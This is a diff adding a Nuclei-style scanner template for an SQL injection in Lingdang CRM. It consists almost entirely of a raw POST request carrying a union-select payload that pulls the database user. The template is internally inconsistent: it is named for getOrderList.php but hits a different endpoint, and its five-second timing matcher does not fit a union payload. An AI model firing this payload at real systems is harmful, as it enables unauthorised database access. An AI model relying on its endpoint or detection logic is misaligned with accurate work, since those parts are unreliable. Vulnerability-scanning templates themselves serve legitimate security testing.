@@ -1,0 +1,35 @@
+id: ldcrm-getorderlist-sqli
+info:
+  name: Lingdang CRM getOrderList.php - SQL Injection
+  author: qwtd
+  severity: high
+  description: |
+    灵当CRM系统接口getOrderList.php存在SQL注入漏洞，攻击者可利用该漏洞获取系统敏感信息，甚至控制整个数据库。
+  reference:
+    - https://mp.weixin.qq.com/s/UtNRvjtYw30MgPCXK9g3QA
+  tags: 灵当CRM
+  classification:
+    cwe-id: CWE-89
+http:
+  - raw:
+      - |
+        POST /crm/WeiXinApp/marketing/index.php?module=Ambassador&action=getMyAmbassador HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Content-Type: application/x-www-form-urlencoded
+        Connection: close
+
+        logincrm_userid=-1 union select user(),2,3#
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - duration >= 5
+      - type: word
+        words:
+          - search_reminds
+      - type: status
+        status:
+          - 200
